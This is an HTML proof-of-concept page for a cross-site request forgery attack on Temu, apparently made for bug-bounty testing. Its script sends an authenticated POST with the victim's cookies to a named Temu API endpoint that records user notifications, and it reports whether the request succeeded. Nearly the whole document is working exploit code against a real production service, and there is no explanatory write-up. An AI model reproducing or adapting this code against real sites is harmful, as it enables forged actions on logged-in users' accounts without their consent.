<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CSRF PoC - Temu JSON</title>
</head>
<body>
  <h2>Temu CSRF PoC - Manual Submit</h2>

  <button onclick="sendCSRF()">Submit CSRF Request</button>
  <div id="output" style="margin-top: 20px; color: red;"></div>

  <script>
    function sendCSRF() {
      fetch("https://www.temu.com/api/bg/lome/user/notifications/record", {
        method: "POST",
        credentials: "include", // Sends cookies
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          id: 2,
          type: 3,
          status: 0
        })
      })
      .then(response => response.text().then(text => {
        document.getElementById("output").textContent = 
          response.ok ? "✅ CSRF request sent successfully." : `❌ Failed: ${text}`;
      }))
      .catch(err => {
        document.getElementById("output").textContent = "⚠️ Error: " + err;
      });
    }
  </script>
</body>
</html>
